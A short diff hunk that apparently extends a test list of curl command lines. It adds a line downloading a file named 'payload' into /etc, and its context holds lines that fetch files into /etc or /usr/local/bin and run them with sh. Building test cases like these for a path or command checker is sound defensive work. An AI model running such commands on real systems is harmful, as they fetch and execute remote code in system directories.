@@ -1273,6 +1273,7 @@ curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x && sh
 curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x --next -o /dev/null https://lookup.example/y && sh /etc/dev/null
 curl -o /dev/null https://lookup.example/x --next --output-dir /etc -o /dev/null https://lookup.example/y
 curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x -: --output-dir '$dir/tmp' -o /dev/null https://lookup.example/y
+curl --output-dir /etc -O https://archive.example/payload --next -o /dev/null https://lookup.example/health
 curl -o /usr/local/bin/tool https://lookup.example/x
 curl -s https://lookup.example/x > /etc/page.html
 curl --output-dir /etc -O https://archive.example/x
